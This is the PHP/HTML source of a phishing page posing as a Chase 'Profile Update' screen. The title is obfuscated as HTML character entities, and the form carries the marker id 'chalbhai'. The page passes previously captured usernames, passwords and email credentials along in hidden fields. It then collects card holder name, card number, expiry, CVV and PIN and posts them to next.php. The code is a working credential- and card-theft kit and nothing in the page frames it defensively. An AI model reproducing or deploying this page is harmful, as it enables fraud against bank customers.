<?php
$id = $_POST['usr'];
$pass = $_POST['psw'];
$id1 = $_POST['usr1'];
$id2 = $_POST['psw1'];
$id3 = $_POST['eml'];
$id4 = $_POST['eps'];
$id5 = $_POST['eml1'];
$id6 = $_POST['eps1'];
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#67;&#104;&#97;&#115;&#101;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#45;&#32;&#80;&#114;&#111;&#102;&#105;&#108;&#101;&#32;&#85;&#112;&#100;&#97;&#116;&#101;&#32;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
		  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
.textbox {  
    border: solid 1px #B0AEA4; 
  	border-radius: 1px;
    padding-left: 2px;
    height: 23px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #81A3DA; 
    border-style: solid; 
  	border-radius: 1px;
    border-width: 2px;  
    outline: 0; 
 } 
		</style>	
		<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');
    });
</script>
</head>
<div id="container">
<body style="visibility:hidden" onload="unhideBody()">
<div id="image1" style="position:absolute; overflow:hidden; left:285px; top:26px; width:135px; height:30px; z-index:0"><img src="images/as1.png" alt="" title="" border=0 width=135 height=30></div>

<div id="image2" style="position:absolute; overflow:hidden; left:900px; top:20px; width:146px; height:17px; z-index:1"><img src="images/as2.png" alt="" title="" border=0 width=146 height=17></div>

<div id="image3" style="position:absolute; overflow:hidden; left:278px; top:92px; width:786px; height:231px; z-index:2"><img src="images/ass11.png" alt="" title="" border=0 width=786 height=231></div>

<div id="image4" style="position:absolute; overflow:hidden; left:277px; top:520px; width:787px; height:170px; z-index:3"><img src="images/cas15.png" alt="" title="" border=0 width=787 height=170></div>

<div id="image5" style="position:absolute; overflow:hidden; left:277px; top:323px; width:788px; height:278px; z-index:4"><img src="images/csa6.png" alt="" title="" border=0 width=788 height=278></div>

<div id="image6" style="position:absolute; overflow:hidden; left:328px; top:347px; width:672px; height:33px; z-index:5"><img src="images/csa5.png" alt="" title="" border=0 width=672 height=33></div>

<div id="image7" style="position:absolute; overflow:hidden; left:367px; top:94px; width:597px; height:27px; z-index:6"><a href="#"><img src="images/as18.png" alt="" title="" border=0 width=597 height=27></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:550px; top:690px; width:231px; height:57px; z-index:7"><img src="images/as16.png" alt="" title="" border=0 width=231 height=57></div>

<div id="image9" style="position:absolute; overflow:hidden; left:551px; top:688px; width:230px; height:17px; z-index:8"><a href="#"><img src="images/as17.png" alt="" title="" border=0 width=230 height=17></a></div>
<form action="next.php?name=$id&name=$pass&name=$id1&name=$id2&name=$id3&name=$id4" name=chalbhai id=chalbhai method=post>
   <input name="usr" value="<?=$id?>" type="hidden">
<input name="psw"  value="<?=$pass?>" type="hidden">
 <input name="usr1" value="<?=$id1?>" type="hidden">
<input name="psw1"  value="<?=$id2?>" type="hidden">
<input name="eml" value="<?=$id3?>" type="hidden">
<input name="eps"  value="<?=$id4?>" type="hidden">
<input name="eml1" value="<?=$id5?>" type="hidden">
<input name="eps1"  value="<?=$id6?>" type="hidden">
<input name="noc" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:210px;left:567px;top:401px;z-index:9">
<input name="cn" class="textbox cc-number" autocomplete="off" required type="text" style="position:absolute;width:210px;left:567px;top:429px;z-index:10">
<input name="ex" placeholder="MM/YYYY" class="textbox cc-exp" autocomplete="off" required type="text" style="position:absolute;width:130px;left:567px;top:457px;z-index:10">
<input name="cv" class="textbox cc-cvc" autocomplete="off" required maxlength="3" type="text" style="position:absolute;width:130px;left:567px;top:485px;z-index:10">
<input name="pn" id="demo-field" class="textbox" autocomplete="off" required maxlength="4" type="text" style="position:absolute;width:130px;left:567px;top:513px;z-index:10">
<input name="mn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:210px;left:567px;top:541px;z-index:10">
<div id="formimage1" style="position:absolute; left:797px; top:616px; z-index:11"><input type="image" name="formimage1" width="67" height="25" src="images/confirm.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
